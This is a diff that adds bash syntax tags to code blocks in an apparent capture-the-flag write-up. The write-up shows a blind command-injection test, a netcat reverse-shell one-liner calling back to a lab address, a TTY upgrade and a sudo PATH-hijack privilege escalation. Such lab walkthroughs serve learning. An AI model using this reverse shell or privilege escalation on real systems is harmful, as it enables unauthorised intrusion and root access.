@@ -95,7 +95,7 @@ To test if `filetype` parameter is vulnerable to blind command injection, I trie
 
 Running `tcpdump` to see all the traffic on my virtual interface revealed incoming `icmp` request from victim host. 
 
-```
+```bash
 sudo tcpdump -i tun0 -vv
 ```
 
@@ -103,7 +103,7 @@ sudo tcpdump -i tun0 -vv
 
 To further exploit this, I used `URL` encoded reverse shell payload:
 
-```
+```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.38 7003 >/tmp/f
 ```
 
@@ -113,14 +113,14 @@ After submitting the payload, I obtained reverse shell as user `wizzard`.
 
 ### Upgrading TTY
 
-```
+```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 ```
 ctrl + z
 ```
-```
+```bash
 stty raw -echo && fg
 ```
 ### User.txt
@@ -133,7 +133,7 @@ stty raw -echo && fg
 
  User `wizzard` can run script `/opt/cleanup.sh` with `sudo` privileges. Additionally user has `SETENV` which gives him permission to modify certain environment variables like `PATH`. 
 
-```
+```bash
 sudo -l
 ```
 
@@ -149,13 +149,13 @@ First I created new `find` binary in `/tmp` directory. New binary is simple bash
 
 Adding permissions to newly created `find` binary. 
 
-```
+```bash
 chmod 777 find
 ```
 
 User has `SETENV` so we can specify path to `/tmp` by adding `PATH=/tmp:$PATH` to `sudo` command. Now when I run `/opt/cleanup.sh` with `sudo` and `PATH` specified to `/tmp` directory, system will first look for `find` binary in the `/tmp` directory where it will find my malicious `find` binary and execute it with `sudo` privileges.
 
-```
+```bash
 sudo PATH=/tmp:$PATH /opt/cleanup.sh
 ```
 
